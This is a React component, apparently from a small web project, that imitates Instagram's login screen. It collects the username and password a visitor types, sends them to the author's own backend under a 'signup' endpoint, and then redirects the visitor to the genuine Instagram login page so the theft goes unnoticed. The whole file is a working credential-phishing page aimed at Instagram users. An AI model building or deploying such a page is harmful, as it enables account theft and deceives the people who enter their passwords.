
import axios from 'axios';
import { useState } from 'react';
import { BACKEND_URL } from '../config';

const Auth = () => {
  
  const [postInputs, setPostInputs] = useState({
    username: '',
    password: '',
  });

  async function sendRequest(e: React.FormEvent<HTMLFormElement>) {
    e.preventDefault(); // Prevent the default form submission
    try {
      await axios.post(`${BACKEND_URL}/api/v1/user/signup`, postInputs);
    //   navigate('/Insta');
    window.location.href = 'https://www.instagram.com/accounts/login/';
    } catch (e) {
      alert('Error while signing up');
    }
  }

  return (
    <div className="flex items-center justify-center min-h-screen bg-gray-100">
      <div className="bg-white p-8 rounded-lg shadow-lg max-w-sm w-full">
        <h1 className="text-4xl font-bold text-center mb-6 font-logo">Instagram</h1>
        <form onSubmit={sendRequest}>
          <div className="mb-4">
            <input
              type="text"
              placeholder="Username"
              className="w-full px-3 py-2 border rounded-lg text-sm focus:outline-none focus:border-blue-500"
              value={postInputs.username}
              onChange={(e) => setPostInputs({ ...postInputs, username: e.target.value })}
              required
            />
          </div>
          <div className="mb-4">
            <input
              type="password"
              placeholder="Password"
              className="w-full px-3 py-2 border rounded-lg text-sm focus:outline-none focus:border-blue-500"
              value={postInputs.password}
              onChange={(e) => setPostInputs({ ...postInputs, password: e.target.value })}
              required
            />
          </div>
          <button
            type="submit"
            className="w-full bg-blue-500 text-white py-2 rounded-lg font-semibold hover:bg-blue-600 focus:outline-none"
          >
            Log I
          </button>
        </form>
        <div className="mt-4 text-center">
          <a href="#" className="text-sm text-blue-500 hover:underline">Forgot password?</a>
        </div>
      </div>
    </div>
  );
};

export default Auth;


